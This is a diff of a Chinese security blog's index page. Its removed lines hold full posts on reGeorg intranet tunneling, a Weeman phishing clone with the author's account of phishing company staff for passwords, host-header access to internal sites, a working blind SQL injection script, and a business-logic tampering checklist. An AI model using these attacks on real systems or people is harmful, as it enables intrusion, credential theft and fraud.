@@ -249,8 +249,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/04/13/浅谈企业网络边界/" itemprop="url">
-                  2016-3-7浅谈企业网络边界
+                <a class="post-title-link" href="/2016/03/07/浅谈企业网络边界/" itemprop="url">
+                  浅谈企业网络边界
                 </a>
               
             
@@ -263,8 +263,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-04-13T09:36:32+08:00" content="2016-04-13">
-              2016-04-13
+            <time itemprop="dateCreated" datetime="2016-03-07T00:00:00+08:00" content="2016-03-07">
+              2016-03-07
             </time>
           </span>
 
@@ -313,7 +313,7 @@
         
           <h2 id="0x01-企业网络边界"><a href="#0x01-企业网络边界" class="headerlink" title="0x01 企业网络边界"></a>0x01 企业网络边界</h2><p>&emsp;&emsp;我们知道既然要从外围进入内网，那么必然要做的一件事情就是跨越边界，所有这个命门我们也就自然应该在企业的内外网边界上来寻找。
           <div class="post-more-link text-center">
-            <a class="btn" href="/2016/04/13/浅谈企业网络边界/#more" rel="contents">
+            <a class="btn" href="/2016/03/07/浅谈企业网络边界/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -392,8 +392,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/工具/" itemprop="url" rel="index">
-                    <span itemprop="name">工具</span>
+                  <a href="/categories/工具使用/" itemprop="url" rel="index">
+                    <span itemprop="name">工具使用</span>
                   </a>
                 </span>
 
@@ -426,168 +426,14 @@
 
       
         
-          
-            <p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1. 首先我们需要明白正向代理和反向代理的区别</span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1.1 正向代理(Forward Proxy)</span></p>
-<hr>
-<p>[python]Lhost－－&gt;proxy－－&gt;Rhost[/python]</p>
-<p><span style="font-family: 'Microsoft Yahei';">Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1.2 反向代理（reverse proxy）</span></p>
-<hr>
-<p>[python]Lhost&lt;－－&gt;proxy&lt;－－&gt;firewall&lt;－－&gt;Rhost[/python]</p>
-<p><span style="font-family: 'Microsoft Yahei';">和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</span></p>
-<p><span style="font-family: 'Microsoft Yahei';">而我们平常使用的reDuh、tunna，和reGeorg一样，都是正向代理。一般都是用户上传一个代理脚本到服务器端，本地的程序去连接服务器上的脚本，脚本程序做代理转发端口和流量。<br></span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2. 工具介绍</span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2.1 reGeorg</span></p>
-<p><span style="font-family: 'Microsoft Yahei';">    reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高。</span></p>
-<p><span style="font-family: 'Microsoft Yahei';">    reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">下载</a></span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2.2 proxifier</span></p>
-<p><span style="font-family: 'Microsoft Yahei';">   Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。<br></span></p>
-<p><span style="font-family: 'Microsoft Yahei';">   下载地址：<a href="https://www.proxifier.com/" target="_blank" rel="external">下载</a></span></p>
-<p><span style="font-family: 'Microsoft Yahei';">   激活码：   <a href="http://wenku.baidu.com/link?url=T9od33JuA7jjxzfyV-wOjsYyARbVXwuXs2GwWwXLkX6vxRU4Rj0p_e2_0l1A0-WT9NOs3sh1OqDbYBgFYXLyjfconba4FF4iqdoz-tV5GH_" target="_blank" rel="external">查看</a></span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">3. 工具配置</span></p>
-<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">   先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</span></p>
-<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard.png" alt="clipboard"></p>
-<p><span style="font-family: 'Microsoft Yahei';">运行py程序：<code>python reGeorgSocksProxy.py -p 8888 -u http:``//[www.exemple.com/test/tunnel.jsp](http://www.exemple.com/test/tunnel.jsp)</code></span></p>
-<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-1.png" alt="clipboard (1)"></p>
-<p>将proxifier打开，在Proxy Server中这样配置</p>
-<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-2.png" alt="clipboard (2)"></p>
-<p><span style="font-family: 'Microsoft Yahei';">然后在远程桌面程序上右键，以Proxifier选择“Proxy SOCKS5 127.0.0.1”打开。ipconfig查询内网机器的ip</span></p>
-<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-3.png" alt="clipboard (3)"></p>
-<p><span style="font-family: 'Microsoft Yahei';">直接在远程连接上输入内网机器的内网ip</span></p>
-<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-4.png" alt="clipboard (4)"></p>
-<p><span style="font-family: 'Microsoft Yahei';">点击连接即可。</span></p>
-<p>&nbsp;</p>
-
-          
-        
-      
-    </div>
-    
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/11/10/傻瓜式通用钓鱼工具Weeman1.5-GreenTree/" itemprop="url">
-                  傻瓜式通用钓鱼工具Weeman1.5-GreenTree
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-11-10T21:55:18+08:00" content="2015-11-10">
-              2015-11-10
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/工具/" itemprop="url" rel="index">
-                    <span itemprop="name">工具</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h6 id="写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。"><a href="#写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。" class="headerlink" title="写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。"></a>写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。</h6><p>相比大家都听过S.E.T社会工程学工具包吧，与其说是一个工具包，我个人理解更像是个框架，里面功能非常丰富，但是安装使用不太便捷小巧，入门不太容易，借此，容我推荐一款老外写的阉割版钓鱼工具Weeman。<br>之前我在FQ的时候无意间在老外的博客发现这么个东西，百度了一下，国内很少甚至可以说没有介绍，估计是太low了，功能很简洁，先看看吧<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912200780240.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912200780240.png" alt="2015110912200780240"></a></p>
-<p>只有四条命令</p>
-<p><pre class="lang:default decode:true">  show   : show default settings. ＃显示默认配置<br>  set    : set value for option (set &lt;option&gt; &lt;value&gt;). ＃设定目标的url以及登录页面（我英文烂，你可以这么理解吧）<br>  run    : start the server. ＃（启动服务）<br>  clear  : clear screen. ＃（清屏，然并卵）<br>  help   : show help or (help &lt;option&gt;.) ＃显示使用说明以及对象<br>  quit   : quit. ＃退出</pre><br>以下拿Tangscan做个案例.<a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912385467090.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912385467090.png" alt="2015110912385467090"></a><br>先拿到登录页面，然后通过抓包获取其登录接口。</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912534556090.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912534556090.png" alt="2015110912534556090"></a></p>
-<p><pre class="lang:default decode:true">( weeman ) : set url <a href="http://www.tangscan.com/login" target="_blank" rel="external">http://www.tangscan.com/login</a> #设置静态页面，即登录页面<br>( weeman ) : set action_url <a href="http://www.tangscan.com/login/login" target="_blank" rel="external">http://www.tangscan.com/login/login</a> ＃活动页面，即跳转页面，登录接口。<br>( weeman ) : set port 2015 ＃设置运行端口<br>( weeman ) : run ＃执行脚本</pre><br>接着访问127.0.0.1:2015<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913431066771.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913431066771.png" alt="2015110913431066771"></a><br>然后输入帐号密码，可以看到这里已经抓到账户密码了<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913430174908.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913430174908.png" alt="2015110913430174908"></a></p>
-<p>好玩的地方在于，就算拿输入正确密码，也可以直接正常登录跳转到正常页面中。<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913460792632.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913460792632.png" alt="2015110913460792632"></a><br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913461680006.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913461680006.png" alt="2015110913461680006"></a></p>
-<p>密码也可以正常抓取<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913474333611.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913474333611.png" alt="2015110913474333611"></a></p>
-<p>源码会下载在根目录<a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913544738601.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913544738601.png" alt="2015110913544738601"></a></p>
-<p>抓到的密码也在根目录下保存。<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913564322953.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913564322953.png" alt="2015110913564322953"></a></p>
-<p>最后是显示一个历史纪录<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110914013412557.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110914013412557.png" alt="2015110914013412557"></a></p>
-<p>其实就是四条命令，上面只是详细说明了一些步骤。。</p>
-<p>一个成功案例<br>在一次周末中，我在拿到内网中一个服务器，为了不打草惊蛇，并没有嗅探，我使用该方法，抓取某个内网系统，然后把自己服务器的地址再以邮件的形式群发给其他企业人员，声称原服务器遭到黑客攻击，临时转移到其他服务器上，请尽快修改密码。<br>然后。。。哗啦啦的一堆密码就来了，服务器地址也的确是自己公司的服务器啊，也可以的确正常登录。一般人很难辨认。</p>
-<p>＃测试环境<br>Linux (any)<br>Mac (any)<br>Windows (Not tested)</p>
-<p>＃安装环境<br>Python &lt;= 2.7.<br>Python BeautifulSoup 4</p>
-<p>下载地址：<code>https://github.com/Hypsurus/weeman</code></p>
-<p>转自：<a href="http://zone.wooyun.org/content/23827" target="_blank" rel="external">http://zone.wooyun.org/content/23827</a></p>
-
-          
+          <h3 id="1-首先我们需要明白正向代理和反向代理的区别"><a href="#1-首先我们需要明白正向代理和反向代理的区别" class="headerlink" title="1. 首先我们需要明白正向代理和反向代理的区别"></a>1. 首先我们需要明白正向代理和反向代理的区别</span></h3><p><strong>1.1 正向代理(Forward Proxy)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost－－&gt;proxy－－&gt;Rhost</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -697,27 +543,12 @@
 
       
         
-          
-            <p>1、host主机头<br>host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.</p>
-<p>2、漏洞成因及危害<br>很多网站为了方便管理和节省服务器成本,将内网管理站点和外网站点放置在同一服务器下,使用一机多站来进行隔离.</p>
-<p>很多情况下一台服务器安装两块网卡,分别接入外网和内网,方便公网访问公开站点,内网访问管理站点.并绑定host.</p>
-<p>例如:</p>
-<p><pre class="lang:default highlight:0 decode:true">xxx.com为公开站点,并且指向IP为公网网卡.<br>admin.xxx.com为管理站点,并且指向内网网卡.</pre><br>看上去好像管理站点admin.xxx.com必须在内网才能访问但是却忽略了host绑定的问题.</p>
-<p>但是当我们将外网IP地址强制绑定到admin.xxx.com的时候web服务器又没有做来源检查,那么我们就可以通过外网访问到本来应该只有内网才能访问的管理站点了.</p>
-<p>并且由于是内网站点很多情况下管理员为了方便都是弱密码,或者直接未授权访问等</p>
-<p>3、漏洞的利用<br>利用的话可以直接使用域名的一个暴力猜解</p>
-<p>将外网IP和内网IP的域名全部记录下来</p>
-<p>例如</p>
-<p><pre class="lang:default highlight:0 decode:true">xxx.com ip 1.1.1.1<br>admin.xxx.com ip 10.0.0.1</pre><br>再使用工具将内网域名绑定到外网站点的IP上</p>
-<p>写入hosts文件</p>
-<p><pre class="lang:default highlight:0 decode:true">1.1.1.1 admin.xxx.com</pre><br>即可访问到内网站点了</p>
-<p>4、漏洞案例<br><a href="http://www.wooyun.org/bugs/wooyun-2014-081180" target="_blank" rel="external">途牛另类方式导致内网部分敏感系统泄露</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093577" target="_blank" rel="external">盛大某游戏GM工具注入进入后台</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-088352" target="_blank" rel="external">傲游内网不完整漫游(大量内外网源码可被泄漏)</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134151" target="_blank" rel="external">一下科技运维不当导致内部敏感信息泄漏</a></p>
-<p>转自：<a href="http://wiki.wooyun.org/server:host" target="_blank" rel="external">http://wiki.wooyun.org/server:host</a></p>
-
-          
+          <p><strong>1、host主机头</strong><br>host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/09/29/关于服务器的host绑定的不安全因素/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -829,245 +660,38 @@
         
           
             <p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在</p>
-<p>[python]</p>
-<p>#! usr/bin/env python</p>
-<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import httplib<br>import time<br>import string<br>import sys<br>import random<br>import urllib</p>
-<p>headers = {‘User-Agent’: ‘Mozilla/5.0 Chrome/28.0.1500.63’,}<br>payloads = list(‘abcdefghijklmnopqrstuvwxyz0123456789@_.’)<br>print ‘start to retrive MySQL user:’<br>user = ‘’<br>for i in range(1,21):<br>    for payload in payloads:<br>        conn = httplib.HTTPConnection(‘www.example.com’, timeout=4)      #连接,host<br>        s = “ascii(mid(lower(user()),%s,1))=%s” % (i, ord(payload))       #payload<br>        conn.request(method=’GET’,url=”/php/1.php?id=1 and %s” % s,headers = headers)  #url<br>        html_header= conn.getresponse().read()<br>        length=len(html_header)<br>        if length&gt;10000:<br>            user+=payload<br>            sys.stdout.write(‘\r[In progress] %s’ % user)<br>            sys.stdout.flush()<br>            break<br>        else:<br>            print ‘.’,<br>            conn.close()</p>
-<p>print ‘\n[Done]MySQL user is’, user</p>
-<p>[/python]</p>
+<pre><code class="python?linenums">#! usr/bin/env python
+# -*- coding: utf-8 -*-
 
-          
-        
-      
-    </div>
-    
-    <div>
-      
-    </div>
+import httplib
+import time
+import string
+import sys
+import random
+import urllib
 
-    <div>
-      
-    </div>
+headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0 Chrome/28.0.1500.63&apos;,}
+payloads = list(&apos;abcdefghijklmnopqrstuvwxyz0123456789@_.&apos;)
+print &apos;start to retrive MySQL user:&apos;
+user = &apos;&apos;
+for i in range(1,21):
+    for payload in payloads:
+        conn = httplib.HTTPConnection(&apos;www.example.com&apos;, timeout=4)      #连接,host
+        s = &quot;ascii(mid(lower(user()),%s,1))=%s&quot; % (i, ord(payload))       #payload
+        conn.request(method=&apos;GET&apos;,url=&quot;/php/1.php?id=1 and %s&quot; % s,headers = headers)  #url
+        html_header= conn.getresponse().read()
+        length=len(html_header)
+        if length&gt;10000:
+            user+=payload
+            sys.stdout.write(&apos;\r[In progress] %s&apos; % user)
+            sys.stdout.flush()
+            break
+        else:
+            print &apos;.&apos;,
+            conn.close()
 
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/07/15/业务安全漏洞挖掘归纳总结/" itemprop="url">
-                  业务安全漏洞挖掘归纳总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-07-15T11:25:36+08:00" content="2015-07-15">
-              2015-07-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/漏洞挖掘/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞挖掘</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="0x00-索引说明"><a href="#0x00-索引说明" class="headerlink" title="0x00 索引说明"></a>0x00 索引说明</h1><hr>
-<p>6.30在OWASP的分享，关于业务安全的漏洞检测模型。进一步的延伸科普。</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312847097.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312847097.png" alt="2015070302312847097"></a></p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312815571.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312815571.png" alt="2015070302312815571"></a></p>
-<h1 id="0x01-身份认证安全"><a href="#0x01-身份认证安全" class="headerlink" title="0x01 身份认证安全"></a>0x01 身份认证安全</h1><hr>
-<p><strong>1 暴力破解</strong></p>
-<p>在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。 简单的验证码爆破。URL: <a href="http://zone.wooyun.org/content/20839" target="_blank" rel="external">http://zone.wooyun.org/content/20839</a></p>
-<p>一些工具及脚本</p>
-<p>Burpsuite</p>
-<p>htpwdScan 撞库爆破必备 URL: <a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="external">https://github.com/lijiejie/htpwdScan</a></p>
-<p>hydra 源码安装xhydra支持更多的协议去爆破 (可破WEB，其他协议不属于业务安全的范畴)</p>
-<p><strong>2 session &amp; cookie类</strong></p>
-<p>会话固定攻击：利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。案例：<a href="http://www.wooyun.org/bugs/wooyun-2013-025427" target="_blank" rel="external">WooYun: 新浪广东美食后台验证逻辑漏洞，直接登录后台，566764名用户资料暴露！</a></p>
-<p>Cookie仿冒：修改cookie中的某个参数可以登录其他用户。 案例：益云广告平台任意帐号登录<a href="http://www.wooyun.org/bugs/wooyun-2014-051424" target="_blank" rel="external">WooYun: 益云广告平台任意帐号登录</a></p>
-<p><strong>3 弱加密</strong></p>
-<p>未使用https，是功能测试点，不好利用。</p>
-<p>前端加密，用密文去后台校验，并利用smart decode可解</p>
-<h1 id="0x02-业务一致性安全"><a href="#0x02-业务一致性安全" class="headerlink" title="0x02 业务一致性安全"></a>0x02 业务一致性安全</h1><hr>
-<p><strong>1 手机号篡改</strong></p>
-<p>a) 抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。</p>
-<p><strong>2 邮箱或者用户篡改</strong></p>
-<p>a) 抓包修改用户或者邮箱参数为其他用户或者邮箱</p>
-<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2014-074441" target="_blank" rel="external">WooYun: 绿盟RSAS安全系统全版本通杀权限管理员绕过漏洞，包括最新 RSAS V5.0.13.2</a></p>
-<p><strong>3 订单id篡改</strong></p>
-<p>a) 查看自己的订单id，然后修改id（加减一）查看是否能查看其它订单信息。</p>
-<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2013-044137" target="_blank" rel="external">WooYun: 广之旅旅行社任意访问用户订单</a></p>
-<p><strong>4 商品编号篡改</strong></p>
-<p>a) 例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换区高积分商品。</p>
-<p>b) 案例：联想某积分商城支付漏洞再绕过 <a href="http://www.wooyun.org/bugs/wooyun-2013-041617" target="_blank" rel="external">WooYun: 联想某积分商城支付漏洞再绕过</a></p>
-<p><strong>5 用户id篡改</strong></p>
-<p>a) 抓包查看自己的用户id，然后修改id（加减1）查看是否能查看其它用户id信息。</p>
-<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0111617" target="_blank" rel="external">WooYun: 拉勾网百万简历泄漏风险(包括手机、邮件、应聘职位等信息、还可冒充企业身份筛选简历、发面试通知等)</a></p>
-<h1 id="0x03-业务数据篡改"><a href="#0x03-业务数据篡改" class="headerlink" title="0x03 业务数据篡改"></a>0x03 业务数据篡改</h1><hr>
-<p><strong>1 金额数据篡改</strong></p>
-<p>a) 抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。 b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0117083" target="_blank" rel="external">WooYun: 12308订单支付时的总价未验证漏洞(支付逻辑漏洞)</a></p>
-<p><strong>2 商品数量篡改</strong></p>
-<p>a) 抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。 b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0109037" target="_blank" rel="external">WooYun: 蔚蓝团支付逻辑漏洞(可负数支付)</a></p>
-<p><strong>3 最大数限制突破</strong></p>
-<p>a) 很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。</p>
-<p><strong>4 本地js参数修改</strong></p>
-<p>a) 部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p>
-<h1 id="0x04-用户输入合规性"><a href="#0x04-用户输入合规性" class="headerlink" title="0x04 用户输入合规性"></a>0x04 用户输入合规性</h1><hr>
-<p>1 注入测试 请参考<a href="http://wiki.wooyun.org/web:sql" target="_blank" rel="external">http://wiki.wooyun.org/web:sql</a></p>
-<p>2 XSS测试 请参考<a href="http://wiki.wooyun.org/web:xss" target="_blank" rel="external">http://wiki.wooyun.org/web:xss</a></p>
-<p>3 Fuzz</p>
-<p>a) 功能测试用的多一些，有可能一个超长特殊字符串导致系统拒绝服务或者功能缺失。（当然fuzz不单单这点用途。）</p>
-<p>b) 不太符合的案例，但思路可借鉴： <a href="http://www.wooyun.org/bugs/wooyun-2014-048293" target="_blank" rel="external">WooYun: 建站之星模糊测试实战之任意文件上传漏洞</a></p>
-<p>c) 可能会用的工具 —— spike</p>
-<p>4 其他用用户输入交互的应用漏洞</p>
-<h1 id="0x05-密码找回漏洞"><a href="#0x05-密码找回漏洞" class="headerlink" title="0x05 密码找回漏洞"></a>0x05 密码找回漏洞</h1><hr>
-<p><strong>1 大力推荐BMa的《密码找回逻辑漏洞总结》</strong></p>
-<p><a href="http://drops.wooyun.org/web/5048" target="_blank" rel="external">http://drops.wooyun.org/web/5048</a></p>
-<p>a) 密码找回逻辑测试一般流程</p>
-<p>i. 首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包</p>
-<p>ii. 分析数据包，找到敏感部分</p>
-<p>iii. 分析后台找回机制所采用的验证手段</p>
-<p>iv. 修改数据包验证推测</p>
-<p>b) 脑图 （详情请参考BMa的《密码找回逻辑漏洞总结》）</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312839779.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312839779.png" alt="2015070302312839779"></a></p>
-<h1 id="0x06-验证码突破"><a href="#0x06-验证码突破" class="headerlink" title="0x06 验证码突破"></a>0x06 验证码突破</h1><hr>
-<p>验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。</p>
-<p><strong>1 验证码暴力破解测试</strong></p>
-<p>a) 使用burp对特定的验证码进行暴力破解</p>
-<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-093932" target="_blank" rel="external">WooYun: 盟友88电商平台任意用户注册与任意用户密码重置漏洞打包</a></p>
-<p><strong>2 验证码时间、次数测试</strong></p>
-<p>a) 抓取携带验证码的数据包不断重复提交，例如：在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。</p>
-<p>b) 案例：</p>
-<p><strong>3 验证码客户端回显测试</strong></p>
-<p>a 当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebug就可看到客户端与服务器进行交互的详细信息</p>
-<p><strong>4 验证码绕过测试</strong></p>
-<p>a) 当第一步向第二步跳转时，抓取数据包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。</p>
-<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-098765" target="_blank" rel="external">WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
-<p><strong>5 验证码js绕过</strong></p>
-<p>a) 短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二部、第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。</p>
-<h1 id="0x07-业务授权安全"><a href="#0x07-业务授权安全" class="headerlink" title="0x07 业务授权安全"></a>0x07 业务授权安全</h1><hr>
-<p><strong>1 未授权访问</strong></p>
-<p>a) 非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p>
-<p><strong>2 越权访问</strong></p>
-<p>越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定</p>
-<p>a) 垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）</p>
